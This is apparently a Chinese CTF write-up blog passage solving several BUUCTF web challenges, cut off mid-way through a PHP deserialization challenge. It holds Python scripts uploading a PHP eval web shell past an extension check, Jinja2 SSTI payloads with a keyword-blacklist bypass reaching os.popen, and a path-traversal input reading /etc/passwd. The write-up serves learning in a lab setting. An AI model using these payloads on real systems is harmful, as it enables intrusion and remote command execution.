<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>       <br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br></code></pre></td></tr></table></figure>

<p>这东西只检测<code>file</code>参数的值，如果上传<code>file1</code>之类的参数他并不会检测后缀。</p>
<p>但直接上传非<code>file</code>参数肯定不行，因为上传后返回的文件信息：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = __ROOT__.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure>

<p>还是<code>file</code>参数的信息，而且上传后的文件名是根据<code>uniqid</code>生成的。</p>
<p>所以解题思路就是上传多个文件，顺序：<code>file</code>,<code>非file</code>.<code>file</code>。通过爆破前后两个<code>file</code>之间的<code>uniqid</code>来确定上传的<code>非file</code>文件名是多少：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&#x27;</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)&#125;<br>files2=&#123;<span class="hljs-string">&#x27;file[]&#x27;</span>:(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files2)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br></code></pre></td></tr></table></figure>

<p><img src="/img/ximpleuploadd1.png" srcset="/img/loading.gif" lazyload alt="ximpleuploadd1"></p>
<p>注意这里<code>files = files</code>，<code>files</code>是<code>post</code>中专门用于上传文件的参数，不能换成<code>data</code>。<code>data</code>这东西一般用于上传字符串。</p>
<p>如果不用<code>file[]</code>这种参数，直接上传<code>php</code>文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&#x27;</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)&#125;<br>files2=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files2)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br></code></pre></td></tr></table></figure>

<p><img src="/img/ximpleuploadd2.png" srcset="/img/loading.gif" lazyload alt="ximpleuploadd2"></p>
<p>其实做这题做的不是很明白。。我看有些师傅说同时上传多个文件就能绕过对<code>php</code>后缀的检测。。但这里是和参数名是否是<code>file</code>有关？</p>
<p>第二种解法就是利用<code>strip_tags</code>函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$file</span>) &#123;<br>      <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]  = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;key&#x27;</span>] = <span class="hljs-variable">$key</span>;<br>       <span class="hljs-comment">/* 通过扩展获取文件类型，可解决FLASH上传$FILES数组返回文件类型错误的问题 */</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$finfo</span>))&#123;<br>                <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;type&#x27;</span>]   =   <span class="hljs-title function_ invoke__">finfo_file</span> ( <span class="hljs-variable">$finfo</span> ,  <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>] 	);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里用<code>strip_tags</code>对文件名进行了处理，所以直接上传<code>任意.&lt;&gt;php</code>经处理后变成<code>任意.php</code>即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  requests<br><br>url = <span class="hljs-string">&quot;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&quot;</span><br><br>files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;1.&lt;&gt;php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r=requests.post(url=url,files=files)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<h4 id="思路总结-4"><a href="#思路总结-4" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>thinkphp</code>文件上传？</p>
<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p><code>SSTI</code>，输入<code>&#123;&#123;7*7&#125;&#125;</code>会报错：</p>
<p>![GWCTF 2019yourname1](img&#x2F;GWCTF 2019yourname1.png)</p>
<p>看了这个报错我还以为不是<code>SSTI</code>。。</p>
<p>过滤了双括号，<code>&#123;%print (7*7)%&#125;</code>发现能执行。</p>
<p>网上比较常见的wp这么写的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span> lipsum.__globals__[<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>][<span class="hljs-string">&#x27;__im&#x27;</span>+<span class="hljs-string">&#x27;port__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;po&#x27;</span>+<span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;命令&#x27;</span>).read()%&#125;<br></code></pre></td></tr></table></figure>

<p><code>&#123;%%&#125;</code>这东西很好理解，过滤双括号后比较常见的绕过方法。不过一开始不知道<code>lipsum</code>这东西是个啥。查了一下<code>lipsum</code>这东西是flask的一个方法，可以直接和<code>__globals__</code>配合：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p>既然有现成的方法就不需要：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">1</span>].__init__.<br></code></pre></td></tr></table></figure>

<p>也可以这么写：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span> lipsum.__globals__.__builconfigtins__.__impoconfigrt__(<span class="hljs-string">&#x27;oconfigs&#x27;</span>).poconfigpen(<span class="hljs-string">&#x27;命令&#x27;</span>).read()%&#125;<br></code></pre></td></tr></table></figure>

<p>这方法发涉及到源码中的过滤方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;args&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;for&#x27;</span>,<br>                 <span class="hljs-string">&#x27; subprocess&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;from_pyfile&#x27;</span>, <span class="hljs-string">&#x27;local&#x27;</span>,<br>                 <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;item&#x27;</span>, <span class="hljs-string">&#x27;getitem&#x27;</span>, <span class="hljs-string">&#x27;getattribute&#x27;</span>, <span class="hljs-string">&#x27;func_globals&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>];<br><span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> no <span class="hljs-keyword">in</span> s:<br>            s = s.replace(no, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">return</span> s<br></code></pre></td></tr></table></figure>

<p>这东西会在<code>blacklist</code>中按顺序取字符串然后检查用户输入中有没有，有的话替换成空继续检测直到不存在目标字符串，然后跳到下一个关键字的检测</p>
<p><code>config</code>这东西被他放到最后了，所以可以在关键字中间插入<code>config</code>实现绕过。</p>
<p>当然也可以分别定义：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__bui&#x27;</span>+&#x27;ltins__&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;__im&#x27;</span>+&#x27;port__&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;o&#x27;</span>+&#x27;s&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;po&#x27;</span>+&#x27;pen&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">print</span>(lipsum[<span class="hljs-string">&#x27;__globals__&#x27;</span>][a][b](c)[d](<span class="hljs-string">&#x27;whoami&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure>

<h4 id="思路总结：-4"><a href="#思路总结：-4" class="headerlink" title="思路总结："></a>思路总结：</h4><p><code>&#123;&#123;&#125;&#125;</code>绕过，<code>lipsum</code>方法。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885?time__1311=n4+xnD0DRDyB5q053b7Yi=YG=kphrOqD5x&alichlgref=https://xz.aliyun.com/t/6885#toc-4">参考文章</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">参考文章</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14797393.html">参考文章</a></p>
<h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p><code>/hurdles</code>:</p>
<p><img src="/img/BSidesCF2020Hurdles2.png" srcset="/img/loading.gif" lazyload alt="BSidesCF2020Hurdles2"></p>
<p>抓包修改请求方式<code>PUT</code>:</p>
<p><img src="/img/BSidesCF2020Hurdles3.png" srcset="/img/loading.gif" lazyload alt="BSidesCF2020Hurdles3"></p>
<p><code>/hurdles/!</code></p>
<p><img src="/img/BSidesCF2020Hurdles4.png" srcset="/img/loading.gif" lazyload alt="BSidesCF2020Hurdles4"></p>
<p><code>PUT /hurdles/!?get=flag</code></p>
<p><img src="/img/BSidesCF2020Hurdles5.png" srcset="/img/loading.gif" lazyload alt="BSidesCF2020Hurdles5"></p>
<p><code>/hurdles/!?get=flag&amp;%26%3D%26%3D%26=1</code>注意这里要给他<code>URL</code>编码。。。</p>
<p><img src="/img/BSidesCF2020Hurdles6.png" srcset="/img/loading.gif" lazyload alt="BSidesCF2020Hurdles6"></p>
<p><code>/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A</code>注意这里<code>%25</code>是<code>%</code>的<code>URL</code>编码，后面还要加个<code>%0A</code>换行符。</p>
<p><img src="/img/BSidesCF2020Hurdles7.png" srcset="/img/loading.gif" lazyload alt="BSidesCF2020Hurdles7"></p>
<p>添加<code>Authorization: Basic cGxheWVyOjEyMzQ1Ng==</code>字段即可。</p>
<p>当然也可以用<code>curl</code>这个工具：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -X PUT &#x27;http://node5.buuoj.cn:<span class="hljs-number">26300</span>/hurdles/!?get=flag&amp;%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>=%<span class="hljs-number">2500</span>%<span class="hljs-number">0</span>a&#x27; -u &#x27;player:<span class="hljs-number">123456</span>&#x27;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>I’m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string ‘open sesame’</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -X PUT &#x27;http://node5.buuoj.cn:<span class="hljs-number">26300</span>/hurdles/!?get=flag&amp;%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>=%<span class="hljs-number">2500</span>%<span class="hljs-number">0</span>a&#x27; -u &#x27;player:<span class="hljs-number">54</span>ef36ec71201fdf9d1423fd26f97f6b&#x27;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>I’m sorry, I was expecting you to be using a 1337 Browser.</p>
</blockquote>
<p>后面懒得写了：</p>
<p><img src="/img/BSidesCF2020Hurdles8.png" srcset="/img/loading.gif" lazyload alt="BSidesCF2020Hurdles8"></p>
<h4 id="思路总结-5"><a href="#思路总结-5" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>X-Forwarded-For</code>实际可能有多个，第一项是真实的<code>IP</code>;注意<code>URL</code>编码。<code>Authorization</code>认证头需要<code>base64</code>编码。</p>
<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>环境打不开，后面在做</p>
<h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p><img src="/img/virink_2019_files_share1.png" srcset="/img/loading.gif" lazyload alt="virink_2019_files_share1"></p>
<p><code>URL</code>前加<code>view-source</code>字段看看：</p>
<p><img src="/img/virink_2019_files_share2.png" srcset="/img/loading.gif" lazyload alt="virink_2019_files_share2"></p>
<p><img src="/img/virink_2019_files_share3.png" srcset="/img/loading.gif" lazyload alt="virink_2019_files_share3"></p>
<p><img src="/img/virink_2019_files_share5.png" srcset="/img/loading.gif" lazyload alt="virink_2019_files_share5"></p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-regexp">/preview?f=/</span>etc/passwd<br>&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;File \/epasswd not found!&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">1</span>&#125;   过滤了tc/ <br>过滤了../<br>preview?f=<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/etctc/</span><span class="hljs-regexp">/passwd可以读/</span>etc/passwd<br>其实就是简单的替换为空，双写就能绕过<br>然后目录遍历拿flag，不过这个flag在目标文件夹下<br>测试的时候发现单独一个/也会被过滤，不过写成：<br>preview?f=<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/f1ag_Is_h3re../</span>/flag<br>还是能读flag。。感觉他这个过滤规则挺奇怪的<br><br></code></pre></td></tr></table></figure>

<h4 id="思路总结-6"><a href="#思路总结-6" class="headerlink" title="思路总结"></a>思路总结</h4><p>目录遍历，<code>/uploads/</code></p>
<h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><p><code>/public/</code>发现是张图片</p>
<h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>文件上传，注册账号时发现<code>admin</code>已经存在。随便注册一个发现是文件上传。可以上传图片甚至<code>php</code>文件，不过上传之后找不到文件路径，只会显示这么个东西：</p>
<p><img src="/img/imgxweb2.png" srcset="/img/loading.gif" lazyload alt="imgxweb2"></p>
<p>本来想着抓包看下<code>php</code>文件上传到哪了，结果发现这么个东西：</p>
<p><img src="/img/imgxweb1.png" srcset="/img/loading.gif" lazyload alt="imgxweb1"></p>
<p>这东西看着像<code>JWT</code>，拿着去解一下：</p>
<p><img src="/img/imgxweb4.png" srcset="/img/loading.gif" lazyload alt="imgxweb4"></p>
<p>给了注册的用户名，初步判断<code>JWT</code>伪造个<code>admin</code>，现在要找<code>secret_key</code></p>
<p>访问<code>robots.txt</code>直接给了<code>/static/secretkey.txt</code>，里面是这么个东西：</p>
<p><code>you-will-never-guess</code></p>
<p>吗的，他一开始里面这么写我还以为这是个假的密钥，想了半天怎么去弄真的结果看了<code>wp</code>发现就是用这个。。TAT</p>
<p>后面就是改<code>session_id</code>然后会出现<code>flag.png</code>这个东西，直接访问对应路径就行。</p>
<h4 id="思路总结-7"><a href="#思路总结-7" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>JWT</code>伪造</p>
<h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs php">/?src=<span class="hljs-number">1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>    